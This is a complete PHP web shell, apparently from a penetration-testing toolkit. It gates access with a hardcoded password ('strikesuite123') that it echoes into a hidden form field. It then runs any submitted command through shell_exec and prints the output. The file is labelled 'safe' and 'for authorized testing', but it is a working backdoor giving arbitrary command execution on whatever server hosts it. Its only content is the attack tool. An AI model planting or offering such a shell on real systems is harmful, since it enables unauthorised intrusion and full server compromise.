<?php
/**
 * Simple PHP Web Shell
 * Safe web shell for authorized testing
 */

// Basic authentication
$password = 'strikesuite123';

if (!isset($_POST['password']) || $_POST['password'] !== $password) {
    ?>
    <form method="post">
        <input type="password" name="password" placeholder="Password" required>
        <input type="submit" value="Login">
    </form>
    <?php
    exit;
}

// Command execution
if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    $output = shell_exec($cmd);
    echo "<pre>$output</pre>";
}
?>

<form method="post">
    <input type="hidden" name="password" value="<?php echo $password; ?>">
    <input type="text" name="cmd" placeholder="Command" style="width: 80%;" required>
    <input type="submit" value="Execute">
</form>
